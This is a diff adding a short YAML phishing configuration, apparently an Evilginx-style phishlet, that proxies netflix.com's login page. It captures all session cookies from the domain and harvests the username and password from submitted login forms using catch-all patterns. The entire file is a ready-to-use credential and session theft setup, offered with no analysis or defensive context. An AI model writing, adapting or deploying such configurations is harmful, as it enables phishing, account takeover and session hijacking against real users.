@@ -1,0 +1,20 @@
+author: '@StephanWithPH'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'netflix.com', session: true, is_landing: true, auto_filter: true}
+auth_tokens:
+  - domain: 'netflix.com'
+    keys: ['.*:regexp']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'userLoginId'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'netflix.com'
+  path: '/login'
